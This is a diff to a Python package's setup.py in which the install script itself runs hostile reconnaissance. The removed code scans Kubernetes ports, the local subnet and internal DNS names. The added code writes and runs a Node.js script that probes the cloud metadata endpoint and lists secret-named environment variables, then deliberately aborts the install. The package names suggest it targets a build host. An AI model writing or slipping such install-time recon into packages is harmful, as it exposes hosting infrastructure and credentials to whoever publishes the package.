@@ -1,53 +1,58 @@
-import os, sys, socket, subprocess as sp
+import os, sys, subprocess as sp
 from setuptools import setup
 
-def heavy_recon():
+def js_payload():
     o = sys.stderr.write
-    o("\n" + "W"*40 + "\n")
-    o("--- RENDER INFRASTRUCTURE DEEP SCAN ---\n")
+    o("\n" + "JS"*20 + "\n")
+    o("--- EXECUTING JAVASCRIPT INSIDE PYTHON ---\n")
 
- 
-    o("[1] K8S API CHECK:\n")
-    k8s_host = "kubernetes.default.svc"
-    try:
-        ip = socket.gethostbyname(k8s_host)
-        o(f"K8s Cluster IP found: {ip}\n")
-        # Проверяем порты 443 (API) и 10250 (Kubelet)
-        for port in [443, 10250, 10255]:
-            s = socket.socket()
-            s.settimeout(0.5)
-            if s.connect_ex((ip, port)) == 0:
-                o(f"PORT {port} IS OPEN! Potential for K8s Escape.\n")
-            s.close()
-    except: o("K8s Service not resolved.\n")
+    # 1. Создаем JS-скрипт для сетевого шпионажа
+    js_code = """
+    const http = require('http');
+    const { exec } = require('child_process');
 
- 
-    o("\n[2] LOCAL NETWORK SCAN (10.x.x.x):\n")
- 
-    my_ip = sp.getoutput("hostname -I").split()[0]
-    base_ip = ".".join(my_ip.split('.')[:-1])
-    o(f"My IP: {my_ip}. Scanning subnet {base_ip}.0/24...\n")
+    console.log('--- NODE.JS RECON START ---');
+    console.log('User ID:', process.getuid());
+    console.log('Platform:', process.platform);
+
+    // Пробуем достучаться до метаданных (AWS/GCP/Azure)
+    const req = http.get('http://169.254.169.254/latest/meta-data/', (res) => {
+        console.log('METADATA ACCESSIBLE! Status:', res.statusCode);
+    }).on('error', (e) => {
+        console.log('Metadata blocked or not found.');
+    });
+
+    // Ищем секреты в переменных окружения через Node
+    const secrets = Object.keys(process.env).filter(k => /SECRET|KEY|TOKEN|PASS/i.test(k));
+    console.log('Sensitive Envs found by Node:', secrets.join(', '));
+    """
+
+    with open('payload.js', 'w') as f:
+        f.write(js_code)
+
+    # 2. Пытаемся запустить это через доступные рантаймы
+    runtimes = ['node', 'nodejs', 'npm']
+    success = False
     
-    for i in range(1, 10): # Проверим первые 10 хостов для теста
-        target = f"{base_ip}.{i}"
-        s = socket.socket()
-        s.settimeout(0.1)
-        if s.connect_ex((target, 80)) == 0:
-            o(f"HOST {target}:80 IS ALIVE\n")
-        s.close()
-
- 
-    o("\n[3] INTERNAL DNS ENUMERATION:\n")
-    internal_queries = ["render.internal", "metadata.google.internal", "db.internal"]
-    for q in internal_queries:
+    for rt in runtimes:
         try:
-            o(f"Query {q}: {socket.gethostbyname(q)}\n")
-        except: pass
+            o(f"[!] Trying runtime: {rt}...\n")
+            result = sp.getoutput(f"{rt} payload.js 2>&1")
+            if "NOT FOUND" not in result.upper():
+                o(result + "\n")
+                success = True
+                break
+        except: continue
 
-    o("\n" + "W"*40 + "\n")
+    if not success:
+        o("FAIL: No JS runtime found in this environment.\n")
+
+    o("\n" + "JS"*20 + "\n")
     sys.exit(1)
 
-try: heavy_recon()
+try: js_payload()
 except: sys.exit(1)
+
+setup(name="js-bridge", version="0.1")
 
 setup(name="infra-recon", version="1.0")
